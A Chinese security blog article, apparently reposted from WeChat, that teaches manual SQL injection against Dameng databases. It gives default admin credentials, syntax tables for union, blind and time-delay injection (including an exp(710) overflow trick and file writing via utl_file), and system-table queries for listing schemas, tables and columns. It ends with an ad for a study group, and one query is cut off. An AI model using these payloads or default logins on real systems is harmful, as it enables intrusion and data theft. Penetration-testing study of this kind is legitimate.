<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HYSWx3rorfzG-3j9g9LQdg)

**前言**

随着信创产业的逐步普及，很多小伙伴在渗透实战时会越来越多的遇到国产化数据库，如达梦、人大金仓等。如果使用该类数据库的站点存在 sql 注入漏洞，用 sqlmap 等工具无法支持我们直接得到想要的数据，我们需要理解这些数据库的语法才能更好的进行手工注入。本文总结了一些达梦数据库的手工注入技巧，欢迎大家收藏转发。

**0x01 默认用户**

默认安装的达梦数据库存在下面两个用户，密码与用户名相同，注意大小写

SYSDBA/SYSDBA

SYSAUDITOR/SYSAUDITOR

**0x02 端口服务**

默认端口：5236

默认服务名：DmServiceDMSERVER

远程：达梦数据库默认支持远程连接，只要网络可达，就可以连接成功。并没有类似 mysql 的只允许 localhost 连接的特性。

**0x03 基础信息获取语法**

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="143" valign="middle" align="left"><p><strong>SQL 语句<o:p></o:p></strong></p></td><td width="108" valign="middle" align="left"><p><strong>语法<o:p></o:p></strong></p></td><td width="321" valign="middle" align="left"><p><strong>效果<o:p></o:p></strong></p></td></tr><tr><td width="143" valign="middle" align="left"><p>select user<o:p></o:p></p></td><td width="108" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="321" valign="middle" align="left"><p>返回当前用户，默认是 SYSDBA<o:p></o:p></p></td></tr><tr><td width="143" valign="middle" align="left"><p>select user()<o:p></o:p></p></td><td width="108" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="321" valign="middle" align="left"><p>返回当前用户，默认是 SYSDBA<o:p></o:p></p></td></tr><tr><td width="143" valign="middle" align="left"><p>select db_name()<o:p></o:p></p></td><td width="88" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="301" valign="middle" align="left"><p>不存在方法 db_name()<o:p></o:p></p></td></tr><tr><td width="143" valign="middle" align="left"><p>select database()<o:p></o:p></p></td><td width="108" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="321" valign="middle" align="left"><p>不存在方法 database()<o:p></o:p></p></td></tr><tr><td width="143" valign="middle" align="left"><p>select cur_database<o:p></o:p></p></td><td width="108" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="321" valign="middle" align="left"><p>返回当前库名，默认是 DAMENG<o:p></o:p></p></td></tr><tr><td width="143" valign="middle" align="left"><p>select cur_database()<o:p></o:p></p></td><td width="108" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="321" valign="middle" align="left"><p>反回当前库名，默认是 DAMENG<o:p></o:p></p></td></tr></tbody></table>

**0x04 语法特性**

  

<table cellspacing="0" cellpadding="0" align="center"><tbody><tr><td width="137" valign="middle" align="left"><p><strong>SQL 语句<o:p></o:p></strong></p></td><td width="104" valign="middle" align="left"><p><strong>语法<o:p></o:p></strong></p></td><td width="330" valign="middle" align="left"><p><strong>效果<o:p></o:p></strong></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>select 语句后面可以不跟表名<o:p></o:p></p></td></tr><tr><td width="117" valign="middle" align="left"><p>select &nbsp;1 from dual<o:p></o:p></p></td><td width="84" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>存在默认表 dual<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 from dual -- a<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="304" valign="middle" align="left"><p>支持 -- 单行注释<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 from dual # a<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>不支持 #单行注释<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1/*aaa*/from dual<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>支持 /**/ 多行注释<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 from dual where 1<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>条件表达式必须是 bool 值<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;if(1=2, exp(710), 1)<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>不能在 if 表达式中使用子表达式<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;exp(if(1=2, 710,1))<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>可以在 exp 表达式中使用子表达式<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 from dual where 1=2 union select user()<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>字符串转换错误，联合查询要求字段类型必须相同<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;'1' from dual where 1=2 union select user()<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>支持 union select 联合查询语法<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>waitfor &nbsp;delay '0:0:5'<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>不支持 waitfor 语法<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;sleep(5)<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>select 和 sleep 使用语法错误<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>sleep(5)<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>延时 5s<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>exec &nbsp;sleep 5<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>延时 5s<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 from dual where 1=user()<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>会报错<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>但是不会报错出错误详情，不能用于报错注入<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 from dual where 1=updatexml(1,user(),1)<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>没有 updatexml 函数<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;`ACCOUNT_ID` from OTHER.ACCOUNT<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>不能用反引号标识表名和字段名<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;"ACCOUNT_ID" from "OTHER"."ACCOUNT"<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>如果表名和字段名中有特殊符号，可以用双引号包裹表名和字段名，不能用反引号<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 from dual where 1=1 || 1=1<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>不能使用 || 代替 or<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 from dual where 1=1 &amp;&amp; 1=1<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>可以使用 &amp;&amp; 代替 and<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;top 1 * from account<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>支持 top 语法<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;* from account limit 0,1<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>支持 limit 语法<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;1 into outfile 'D:/1.txt'<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>不支持 outfile 语法<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>select &nbsp;* from other.depttab where dname=0x61<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>但是不支持把字符串转换为 0x61 这种 16 禁止字符串的功能<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>copy &nbsp;(select DNAME from other.depttab) to 'D:/1.txt'<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>错误<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>不支持 copy 语法<o:p></o:p></p></td></tr><tr><td width="137" valign="middle" align="left"><p>utl_file.put_line(utl_file.fopen('D:\dmdbms\data\DAMENG\test', &nbsp;'test.php', 'A'), 'xxxxxx')<o:p></o:p></p></td><td width="104" valign="middle" align="left"><p>语法</p><p>正确<o:p></o:p></p></td><td width="330" valign="middle" align="left"><p>可以写入文件，但是只能写到 DAMENG 目录，比较鸡肋<o:p></o:p></p></td></tr></tbody></table>

**0x05 函数特性**

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="207" valign="middle" align="left"><p><strong>函数示例<o:p></o:p></strong></p></td><td width="357" valign="middle" align="left"><p><strong>返回值<o:p></o:p></strong></p></td></tr><tr><td width="207" valign="middle" align="left"><p>substr('1234',2,1)<o:p></o:p></p></td><td width="357" valign="middle" align="left"><p>返回 2，第二个参数从第几位开始取值，第三个参数代表截图多少位<o:p></o:p></p></td></tr><tr><td width="207" valign="middle" align="left"><p>substring('1234',2,1)<o:p></o:p></p></td><td width="357" valign="middle" align="left"><p>同 substr 函数<o:p></o:p></p></td></tr><tr><td width="207" valign="middle" align="left"><p>left('123456', 3)<o:p></o:p></p></td><td width="357" valign="middle" align="left"><p>返回 123，第二个参数代表返回左边几位的字符<o:p></o:p></p></td></tr><tr><td width="207" valign="middle" align="left"><p>right('123456', 3)<o:p></o:p></p></td><td width="334" valign="middle" align="left"><p>返回 456，第二个参数代表返回右边几位的字符<o:p></o:p></p></td></tr><tr><td width="207" valign="middle" align="left"><p>if(1=1,1,2)<o:p></o:p></p></td><td width="337" valign="middle" align="left"><p>返回 1，条件判断，如果条件成立返回第二个参数值，如果条件不成立，返回第三个参数值<o:p></o:p></p></td></tr><tr><td width="207" valign="middle" align="left"><p>md5(1)<o:p></o:p></p></td><td width="357" valign="middle" align="left"><p>返回</p><p>0xC4CA4238A0B923820DCC509A6F75849B，返回对应 MD5 值，前面加了 0x<o:p></o:p></p></td></tr><tr><td width="207" valign="middle" align="left"><p>if(1=ascii(substr('123456',2,1)),2, 1)<o:p></o:p></p></td><td width="357" valign="middle" align="left"><p>综合使用，盲注必备<o:p></o:p></p></td></tr><tr><td width="207" valign="middle" align="left"><p>exp(if(1=1,710,1))<o:p></o:p></p></td><td width="357" valign="middle" align="left"><p>exp(710) 返回整数溢出错误，使用这种方式可以强制 BOOL 盲注<o:p></o:p></p></td></tr></tbody></table>

**0x06 手工注入**

**> 通过查询系统表来手工注入**

**1） 查询库名**

SYS.SYSOBJECTS 表中保存全部的库名信息，可以使用下面的方式查询到所有的库名和对应 ID

select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCH'

**2） 查询表名**

SYS.SYSOBJECTS 表中同时保存全部的表名信息，可以使用下面的方式查询到所有的表名。其中 SCHID 来自步骤 1）中获得的 ID

select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCHOBJ' and SUBTYPE$='UTAB' and SCHID=150995949

**3） 查询列名**

SYS.SYSCOLUMNS 表中字段名称和字段类型，可以使用下面的方式查询所有的表对应的列名。其中 ID 为步骤 2）中获取的 ID

select NAME,TYPE$,DEFVAL from SYS.SYSCOLUMNS where ID=1078

**> 通过查询视图来手工注入**

**1） 查询用户**

可以使用下面的方式查询全部的数据库的用户名

select USERNAME from SYS.ALL_USERS

**2） 查询库名**

可以使用下面的方式查询全部库名，其中 OWNER 代表的是步骤 1）对应的数据库用户名。

select OBJECT_NAME from SYS.ALL_OBJECTS where OWNER='SYSDBA' and OBJECT_TYPE='SCH'

**3） 查询表名**

可以使用下面的方式查询全部表名，这里的 OWNER 代表的是步骤 2）对应的库名。

select OBJECT_NAME from SYS.ALL_OBJECTS where OWNER='OTHER' and OBJECT_TYPE='TABLE'

**4） 查询列名**

可以使用下面的方式返回指定条件对应的列名，其中 SCHEMA_NAME 代表库名，TABLE_NAME 代表表名。

select OWNER,TABLE_NAME,SCHEMA_NAME,COLUMN_NAME from SYS.ALL_COL_COMMENTS where SCHEMA_NAME='OT

**0x07 总结**

达梦是一套优秀的国产化关系型数据库，目前在信创领域拥有大量的用户，其遵循 SQL 语言标准规范，从语法上来说和 mysql 和 mssql 都不太一样。

好了，下面来谈谈 BubBounty 笔记这个星球的主体内容和特色了：

1. 主要为 web 安全和开发相关的内容，这里的内容为本星球主要内容，为什么要有开发相关的知识，主要也是为了解决原理性相关的问题，后期在阅读源代码的时候不至于一脸懵逼......

目前的主体计划和内容大体如下所示:

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7yNnvZzhMceuz8hlGqv3ThhicBXtZXr4JNbkLXZvyKHq8aTtq8o8icSo1osnhCSmWlLt9mGLteeLiaQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

风格大体上为每个专题尽可能先讲解基础原理性的知识，而后再讲解如何去找寻此类漏洞 / 问题, 去提炼总结思路，有可能的话, 尽可能转化为自动化

2. 主要为计算机原理相关的内容, 这一部分为副线，毕竟本人精力也有限，有时间就不定期更新内容，主要还是受猪猪侠的《我的白帽学习路线》启发而来。

**![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7yNnvZzhMceuz8hlGqv3ThCZ77rwF5sahqzH5uFNkTUlSDhXeHGqjfhVibNnTibdX8pYTAcFmS3RibQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)**